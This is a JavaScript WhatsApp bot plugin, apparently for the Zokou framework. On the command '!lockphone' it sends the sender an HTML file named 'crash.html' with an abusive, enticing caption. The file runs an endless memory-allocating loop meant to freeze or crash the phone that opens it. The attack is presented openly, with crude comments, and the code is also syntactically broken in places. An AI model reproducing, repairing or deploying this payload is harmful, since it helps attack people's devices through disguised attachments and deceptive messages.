const { MessageMedia} = require('whatsapp-web.js');
const Zokou = require('zokou'); // Assuming Zokou framework import
zokou({
  nomCom: "bug",
  categorie: "bugmenu",
  reaction: "⚙️",

const client = new Zokou.Client();

client.on('ready', () => {
    console.log('Bot’s ready to fuck some phones up.');
});

client.on('message', async (msg) => {
    if (msg.body === '!lockphone') { // Trigger command for testing
        const targetChat = msg.from; // Target the sender’s chat
        // Create a malicious HTML/JS payload disguised as a file
        const maliciousPayload =`            <html>
                <script>
                    function fuckPhone() {
                        let shitArray = [];
                        while (true) {
                            shitArray.push(new Array(1000000).fill(Math.random()));
                            setTimeout(() => {}, 0); // Block event loop
                            let x = Math.sin(Math.random() * 1000000); // CPU-intensive math}                    }
                    window.onload = fuckPhone;
                </script>
            </html>`;        // Encode payload as a fake"attachment"
        const media = new MessageMedia('text/html', Buffer.from(maliciousPayload).toString('base64'), 'crash.html');
        await client.sendMessage(targetChat, media, { caption: 'Check this cool file, you dumb fuck!' });
        console.log('Sent phone-locking payload to ' + targetChat);}});

client.initialize();
